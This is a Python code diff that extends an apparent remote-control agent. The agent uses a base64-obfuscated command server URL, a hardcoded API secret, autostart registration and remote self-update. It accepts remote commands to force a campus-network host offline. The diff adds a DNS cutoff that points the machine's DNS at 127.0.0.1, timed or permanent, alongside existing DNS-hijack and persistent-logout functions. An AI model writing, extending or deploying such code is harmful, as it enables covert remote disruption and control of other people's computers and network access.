@@ -12,7 +12,7 @@ import urllib.request, urllib.parse, urllib.error
 _S = b'aHR0cHM6Ly95dWFuYWkuYmVzdC9neWs='  # https://yuanai.best/gyk
 DEFAULT_SERVER = base64.b64decode(_S).decode()
 PORTAL_IP = "10.228.9.7"
-AGENT_VERSION = "1.52"  # 版本号, 每次更新递增
+AGENT_VERSION = "1.53"  # 版本号, 每次更新递增
 # API 鉴权密钥 (服务器和客户端必须一致)
 API_SECRET = "CampusNet@2026#Secure"
 HEARTBEAT_INTERVAL = 5  # 心跳间隔(秒)
@@ -825,6 +825,115 @@ def get_dns_status():
     except:
         return False, "查询失败"
 
+# ============ DNS 兜底断网 ============
+
+_DNS_BACKUP_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "_dns_backup.json")
+
+def _save_dns_backup():
+    """保存当前 DNS 配置到文件 (断网前调用)
+    返回 backup dict: {is_static, servers, adapter, time}
+    """
+    is_static, dns_str = get_dns_status()
+    backup = {
+        "is_static": is_static,
+        "servers": dns_str,
+        "time": time.time(),
+    }
+    try:
+        with open(_DNS_BACKUP_FILE, "w") as f:
+            json.dump(backup, f)
+    except:
+        pass
+    return backup
+
+def _restore_dns_from_backup():
+    """从备份恢复 DNS, 返回 (success, message)
+    优先级: 备份的原始DNS → 8.8.8.8 → DHCP
+    """
+    backup = None
+    try:
+        with open(_DNS_BACKUP_FILE, "r") as f:
+            backup = json.load(f)
+    except:
+        pass
+    
+    if backup and backup.get("is_static") and backup.get("servers"):
+        # 原来是静态 DNS, 恢复为原值
+        servers = backup["servers"].split(",")
+        primary = servers[0].strip()
+        secondary = servers[1].strip() if len(servers) > 1 else ""
+        # 检查是不是我们设的 127.0.0.1
+        if primary == "127.0.0.1":
+            # 备份本身就是 127, 回退到安全值
+            ok, msg = reset_dns()  # DHCP
+            if not ok:
+                ok, msg = set_dns_hijack("8.8.8.8", "114.114.114.114")
+        else:
+            ok, msg = set_dns_hijack(primary, secondary)
+    else:
+        # 原来是 DHCP 或无备份, 恢复 DHCP
+        ok, msg = reset_dns()
+        if not ok:
+            # DHCP 恢复失败, 兜底用公共 DNS
+            ok, msg = set_dns_hijack("8.8.8.8", "114.114.114.114")
+    
+    # 清理备份文件
+    try:
+        os.remove(_DNS_BACKUP_FILE)
+    except:
+        pass
+    
+    return ok, f"DNS已恢复: {msg}"
+
+def dns_disconnect(duration=300):
+    """DNS 兜底断网: 设置 DNS 为 127.0.0.1 使网络不可用
+    
+    duration: 断网持续秒数, 0=永久(需手动恢复)
+    返回 (success, message, restore_at)
+    """
+    if platform.system() != "Windows":
+        return False, "仅支持 Windows", 0
+    
+    # 1. 保存当前 DNS
+    backup = _save_dns_backup()
+    
+    # 2. 设置 DNS 为 127.0.0.1
+    ok, msg = set_dns_hijack("127.0.0.1")
+    if not ok:
+        return False, f"DNS断网失败: {msg}", 0
+    
+    restore_at = time.time() + duration if duration > 0 else 0
+    
+    # 更新备份文件加入恢复时间
+    try:
+        backup["restore_at"] = restore_at
+        backup["disconnect_time"] = time.time()
+        with open(_DNS_BACKUP_FILE, "w") as f:
+            json.dump(backup, f)
+    except:
+        pass
+    
+    dur_str = f"{duration}秒后自动恢复" if duration > 0 else "永久(需手动恢复)"
+    return True, f"DNS断网生效 (原DNS: {backup.get('servers','DHCP')}) | {dur_str}", restore_at
+
+def _check_dns_restore():
+    """检查是否有待恢复的 DNS (启动时 + 定时调用)
+    返回 True 如果执行了恢复
+    """
+    try:
+        with open(_DNS_BACKUP_FILE, "r") as f:
+            backup = json.load(f)
+    except:
+        return False
+    
+    restore_at = backup.get("restore_at", 0)
+    if restore_at > 0 and time.time() >= restore_at:
+        print("  [DNS] 断网定时到期, 自动恢复 DNS...")
+        ok, msg = _restore_dns_from_backup()
+        print(f"  [DNS] {msg}")
+        return True
+    return False
+
 # ============ 远程自更新 ============
 
 def _cleanup_old_exe():
@@ -1293,6 +1402,7 @@ class Agent:
         self.was_online = False     # 上一次检测是否在线
         self.force_offline = False  # 强制离线锁: True时持续执行下线
         self.force_offline_until = 0   # 强制离线到期时间戳 (0=永久直到手动解锁)
+        self._dns_blocked = os.path.exists(_DNS_BACKUP_FILE)  # DNS断网状态
 
     def get_uptime(self):
         s = int(time.time() - self.start_time)
@@ -1303,11 +1413,18 @@ class Agent:
     def _enforce_offline(self, online):
         """强制离线: 检测到又被无感认证自动连上时, 立刻再次下线"""
         if not self.force_offline:
+            # 即使没有 force_offline, 也要检查 DNS 定时恢复
+            _check_dns_restore()
             return
         # 检查定时解锁
         if self.force_offline_until > 0 and time.time() >= self.force_offline_until:
             self.force_offline = False
             self.force_offline_until = 0
+            # 同时恢复 DNS
+            if getattr(self, '_dns_blocked', False) or os.path.exists(_DNS_BACKUP_FILE):
+                print("  [强制离线] 定时到期, 恢复 DNS...")
+                _restore_dns_from_backup()
+                self._dns_blocked = False
             print("  [强制离线] 定时到期，自动解锁")
             return
         if not online:
@@ -1374,6 +1491,7 @@ class Agent:
             "bandwidth_limit": bw_limit,       # 0=无限速, >0 = KB/s
             "dns_hijacked": dns_hijacked,      # bool
             "dns_servers": dns_servers,         # 当前DNS字符串
+            "dns_blocked": self._dns_blocked,   # DNS断网兜底状态
             "version": AGENT_VERSION,
         }
 
@@ -1419,12 +1537,14 @@ class Agent:
         
         try:
             if command == "logout":
-                S(1, 4, "接收强制下线指令")
-                S(2, 4, "执行 full_logout...")
+                dns_block = params.get("dns_block", False)
+                total = 6 if dns_block else 4
+                S(1, total, "接收强制下线指令" + (" (含DNS断网)" if dns_block else ""))
+                S(2, total, "执行 full_logout...")
                 r = self.net.full_logout()
                 success = r.get("result") == "success"
                 message = r.get("message", "已下线" if success else "下线失败")
-                S(3, 4, f"登出结果: {message}", "ok" if success else "error")
+                S(3, total, f"登出结果: {message}", "ok" if success else "error")
                 self.force_offline = True
                 self.reconnect_at = 0
                 duration = int(params.get("duration", 0))
@@ -1434,7 +1554,13 @@ class Agent:
                 else:
                     self.force_offline_until = 0
                     message += " | 强制离线(永久,发送unlock解锁)"
-                S(4, 4, f"离线锁已设置: {message}", "ok")
+                S(4, total, f"离线锁已设置", "ok")
+                if dns_block:
+                    S(5, total, "DNS兜底断网: 备份当前DNS → 设为127.0.0.1...")
+                    dns_ok, dns_msg, _ = dns_disconnect(duration)
+                    self._dns_blocked = True
+                    message += f" | DNS: {dns_msg}"
+                    S(6, total, dns_msg, "ok" if dns_ok else "error")
 
             elif command == "cancel_mab":
                 S(1, 5, "清除缓存, 准备获取 user_index")
@@ -1463,12 +1589,39 @@ class Agent:
                     S(5, 5, message, "ok" if success else "error")
 
             elif command == "unlock":
-                S(1, 2, "解除强制离线锁")
+                has_dns = getattr(self, '_dns_blocked', False) or os.path.exists(_DNS_BACKUP_FILE)
+                total = 4 if has_dns else 2
+                S(1, total, "解除强制离线锁")
                 self.force_offline = False
                 self.force_offline_until = 0
                 success = True
                 message = "强制离线锁已解除"
-                S(2, 2, message, "ok")
+                S(2, total, message, "ok")
+                if has_dns:
+                    S(3, total, "恢复原始 DNS 设置...")
+                    dns_ok, dns_msg = _restore_dns_from_backup()
+                    self._dns_blocked = False
+                    message += f" | {dns_msg}"
+                    S(4, total, dns_msg, "ok" if dns_ok else "error")
+
+            elif command == "dns_disconnect":
+                dur = int(params.get("duration", 300))
+                S(1, 3, f"接收DNS断网指令: {dur}秒")
+                S(2, 3, "备份当前DNS → 设为127.0.0.1...")
+                ok, msg, restore_at = dns_disconnect(dur)
+                success = ok
+                message = msg
+                if ok:
+                    self._dns_blocked = True
+                S(3, 3, msg, "ok" if ok else "error")
+
+            elif command == "dns_restore":
+                S(1, 2, "接收DNS恢复指令")
+                ok, msg = _restore_dns_from_backup()
+                self._dns_blocked = False
+                success = ok
+                message = msg
+                S(2, 2, msg, "ok" if ok else "error")
 
             elif command in ("login_now", "login"):
                 S(1, 1, "远程上线登录功能已禁用", "error")
@@ -1625,6 +1778,10 @@ class Agent:
         
         # 清理上次更新留下的旧版本
         _cleanup_old_exe()
+        
+        # 检查 DNS 断网是否已过期需要恢复
+        if _check_dns_restore():
+            print("  ✓ 已恢复过期的 DNS 断网设置")
         
         # 每次启动都刷新自启注册 (修复路径变化/被清理的情况)
         try:
